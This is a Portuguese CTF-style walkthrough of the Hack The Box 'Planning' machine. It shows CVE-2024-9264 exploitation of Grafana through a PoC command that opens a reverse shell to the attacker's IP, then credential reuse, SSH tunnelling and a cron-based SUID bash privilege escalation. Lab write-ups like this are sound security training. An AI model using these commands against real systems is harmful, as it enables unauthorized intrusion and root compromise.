---
title: "Hack The Box - Planning"
author: imendes
date: 2026-01-18
subject: "Markdown"
description: "Walkthrough da máquina Planning (HTB), explorando execução remota de código em uma instância Grafana desatualizada e posterior escalada de privilégios."
keywords: [Markdown, Example]
subtitle: "HTB Machine Planning"
lang: "pt-br"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [Hack The Box Machines, Linux, Easy]
---
## Hack The Box - Planning

### Introdução

Este relatório detalha os achados de um teste de penetração interna conduzido na máquina Planning do ambiente Hack The Box. O objetivo foi avaliar a postura de segurança do sistema, identificando e explorando vulnerabilidades.

A análise revelou uma vulnerabilidade crítica em um serviço Grafana desatualizado, que permitiu a execução de código remotamente. Essa vulnerabilidade, combinada a uma configuração de serviço interna incorreta, concedeu acesso administrativo total ao sistema. Todas as vulnerabilidades identificadas foram exploradas com sucesso, resultando no acesso de nível root, o que demonstra um risco de segurança significativo.

### Recomendações

Para mitigar as vulnerabilidades identificadas neste relatório, as seguintes ações são recomendadas:

- Gerenciamento de Patches: Atualize imediatamente o serviço Grafana para uma versão corrigida que não seja vulnerável à CVE-2024-9264.
- Princípio do Mínimo Privilégio: Restrinja as permissões de usuário ao estritamente necessário. Credenciais administrativas não devem ser armazenadas em arquivos acessíveis.
- Rotina de Segurança: Adote uma rotina de atualizações e auditorias de segurança para identificar e corrigir falhas antes que possam ser exploradas.

## Metodologia

O teste de penetração foi realizado utilizando uma abordagem amplamente adotada, que consiste em várias fases para identificar e explorar vulnerabilidades de forma eficaz:

- Coleta de Informações (Information Gathering): Identificação do endereço IP do alvo e dos serviços ativos.
- Enumeração de Serviços (Service Enumeration): Análise detalhada de portas abertas e serviços em execução para encontrar possíveis pontos de entrada.
- Exploração (Penetration): Aproveitamento das vulnerabilidades identificadas para obter acesso inicial ao sistema.
- Escalada de Privilégios (Privilege Escalation): Obtenção de acesso de nível superior, culminando no usuário root.
- Limpeza (House Cleaning): Remoção de todos os artefatos para restaurar a máquina ao seu estado original.

## Coleta de informações

**Endereço IP do alvo**

10.10.11.68

**Endereço IP do atacante**
10.10.16.86

### Enumeração de Serviços

A enumeração focou em identificar as portas abertas e os serviços em execução na máquina alvo.

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.11.68       | **TCP**: 22,80

Na porta 80 há um redirecionamento para o domínio `planning.htb`.Para resolver o nome de domínio, a seguinte entrada foi adicionada ao arquivo /etc/hosts:
```bash
#  ajuste de resolução de nome
echo "10.10.11.68 planning.htb" | sudo tee -a /etc/hosts
```
### Enumeração de VHosts
Um scan com `ffuf` foi utilizado para identificar outros vhosts:
```bash
ffuf -u http://planning.htb \
  -w /opt/SecLists/Discovery/DNS/service-names.txt:FUZZ \
  -H 'Host: FUZZ.planning.htb' \
  -mc all -fs 178
```
Esse scan identificou o vhost `grafana.planning.htb`, que foi também adicionado em `/etc/hosts`: 
```bash
#  ajuste de resolução de nome
echo "10.10.11.68 grafana.planning.htb" | sudo tee -a /etc/hosts
```
### Coleta de informações: Grafana
Acessar grafana.planning.htb exibiu a página de login. A versão no canto superior direito, Grafana v11.0.0, é conhecida por ser vulnerável. O nome de usuário administrativo enzo também foi identificado nas configurações.

## Exploração
Vulnerabilidade: CVE-2024-9264 - Injeção de Comando Remota via expressões SQL.

Explicação da Vulnerabilidade:
O serviço Grafana em execução no servidor é uma versão desatualizada e suscetível à CVE-2024-9264. Esta vulnerabilidade permite que um atacante autenticado injete e execute comandos arbitrários no sistema subjacente, explorando uma falha nas expressões SQL.

Severidade: Crítica

Prova de Conceito (PoC):
Um script PoC em Python do GitHub foi utilizado para explorar esta vulnerabilidade. O script permite a execução de comandos remotos ao usar as credenciais de autenticação.
```bash
python3 poc.py --url http://grafana.planning.htb --username admin --password  <admin_password> --reverse-ip 10.10.16.86 --reverse-port 9001
```
A execução deste comando concedeu um reverse shell na máquina do atacante, fornecendo o acesso inicial.

\newpage

### Manutencção de Acesso

Listando as variáveis de ambientes no shell atual:

![Variáveis de ambiente](assets/img/Planning/shell_env.png){: w="700" h="400" }

Com as credenciais `GF_SECURITY_ADMIN_USER` e `GF_SECURITY_ADMIN_PASSWORD`, é possível acessar o ssh da máquina: 
```bash
ssh enzo@10.10.11.68 
```
Após obter acesso inicial como o usuário enzo, a flag user.txt foi recuperada do diretório home do usuário.

### Escalada de Privilégios
Para a escalada de privilégios, o script linpeas.sh foi transferido para a máquina usando scp
```bash
scp linpeas.sh enzo@10.10.11.68:/home/enzo/
```

Na enumeração, é mostrado a porta 8000 aberta. Utilizando `curl` verfica-se que trata-se de um serviço web express.

![Descobertas de serviços locais](./assets/img/Planning/express_curl.png){: w="700" h="400" }

O serviço foi acessado via tunelamento ssh `ssh enzo@10.10.11.68 -L 8000:127.0.0.1:8000` . Porém, uma credencial é requisitada.

![Credenciais Web](./assets/img/Planning/web_credential.png){: w="700" h="400" }

Prosseguindo com a verificação da enueração do `linpeas`, observa-se um arquivo de banco de dados no diretório `/opt/` com permissão de leitura: 
```
/opt/crontabs/crontab.db
```
Em seu conteudo, há uma senha utilizada para comprimir um arquivo em uma rotina do cron. Com o nome de usuário `root` e a senha encontrada no arquivo do banco de dados o seviço web foi acessado.

![Cron UI](./assets/img/Planning/CrontabUi.png){: w="700" h="400" }

Uma nova tarefa foi criada para executar um comando que concederia um shell de root:

![Bash Job](./assets/img/Planning/cronjob_bash.png){: w="700" h="400" }

Após a execução da tarefa do cron, o binário bash recebeu permissões SUID, permitindo que o atacante o executasse como root. O seguinte comando foi então usado para obter um shell de root e recuperar a flag root.txt:

![Acesso ao root](./assets/img/Planning/root.png){: w="700" h="400" }

### Limpeza
Após a conclusão do teste de penetração e a captura das flags de usuário e root, todos os artefatos, incluindo o script linpeas.sh e quaisquer arquivos criados, foram removidos do sistema para garantir que ele fosse restaurado ao seu estado original.
